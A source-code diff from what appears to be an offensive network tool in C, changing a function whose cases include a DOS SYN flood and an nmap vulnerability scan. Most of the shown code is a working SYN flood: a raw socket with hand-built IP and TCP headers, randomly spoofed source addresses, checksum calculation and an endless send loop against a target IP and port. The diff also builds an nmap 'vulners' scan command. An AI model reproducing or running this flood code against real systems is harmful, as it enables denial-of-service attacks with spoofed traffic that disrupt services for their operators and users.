@@ -59,21 +59,22 @@ int any(int type){
 		free_char_double_pointer(&queries,msgs);
 		break;
 		case ANY_DOS_SYN_FLOOD_ATTACK:
-			printf("DOS SYN Flood running...\n");
+			printf("  DOS SYN Flood running...\n");
 			srand(time(0));
 			int skDos=socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 			setsockopt(skDos, SOL_SOCKET, SO_BINDTODEVICE, networkInfo.interfaceName, strlen(networkInfo.interfaceName));
 			if(skDos<0) return SOCKET_SETOPT_ERROR;
-			char datagram[4096];
-			struct iphdr *iph = (struct iphdr *) datagram;
-			struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
+			char datagram[4096]="";
+			struct iphdr *iph=(struct iphdr *) datagram;
+			struct tcphdr *tcph=(struct tcphdr *) (datagram + sizeof (struct ip));
 			struct sockaddr_in  dest;
 			struct PseudoHeader psh;
 			int sourcePort=rand()%50000+10000;
 			char sourceIp[20]="";
 			sprintf(sourceIp,"%d.%d.%d.%d", rand()%255+1, rand()%255+1, rand()%255+1, rand()%255+1);
 			memset(datagram,0,4096);
-			//dest_ip.s_addr=ip;
+			//dest_ip.s_addr=dest;//?
+			dest.sin_port=htons (portUnderHacking); //
 			iph->ihl = 5;
 			iph->version = 4;
 			iph->tos = 0;
@@ -103,7 +104,8 @@ int any(int type){
 			tcph->urg_ptr = 0;
 			int one=1;
 			const int *val = &one;
-			if(setsockopt(skDos, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) return show_message("setsockopt() error. ",0, errno, ERROR_MESSAGE, TRUE);
+			if(setsockopt(skDos, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+				return show_message("setsockopt() error. ",0, errno, ERROR_MESSAGE, TRUE);
 			dest.sin_family=AF_INET;
 			dest.sin_addr.s_addr=target.targetIp.s_addr;
 			tcph->dest=htons(portUnderHacking);
@@ -113,14 +115,15 @@ int any(int type){
 			psh.placeholder=0;
 			psh.protocol=IPPROTO_TCP;
 			psh.tcp_length=htons(sizeof(struct tcphdr));
-			printf("Flooding from: %s:%d...\n",sourceIp, sourcePort);
+			printf("\n  Flooding from: %s:%d...\n",sourceIp, sourcePort);
 			while(!cancelCurrentProcess){
 				memcpy(&psh.tcp,tcph,sizeof(struct tcphdr));
 				tcph->check=csum((unsigned short*) &psh,sizeof(struct PseudoHeader));
-				if(sendto(skDos,datagram,sizeof(struct iphdr)+sizeof(struct tcphdr),0,(struct sockaddr *) &dest,sizeof (dest))<0) return SENDING_PACKETS_ERROR;
+				if(sendto(skDos,datagram,sizeof(struct iphdr)+sizeof(struct tcphdr),0,
+						(struct sockaddr *) &dest,sizeof (dest))<0) return SENDING_PACKETS_ERROR;
 			}
 			close(skDos);
-			printf("DOS SYN Flood finished...\n\n");
+			printf("\n  DOS SYN Flood finished...\n");
 			break;
 		case ANY_NMAP_VULNER_SCAN:
 			snprintf(cmd,sizeof(cmd),"nmap -sV -p %d --script vulners %s",portUnderHacking, target.strTargetIp);
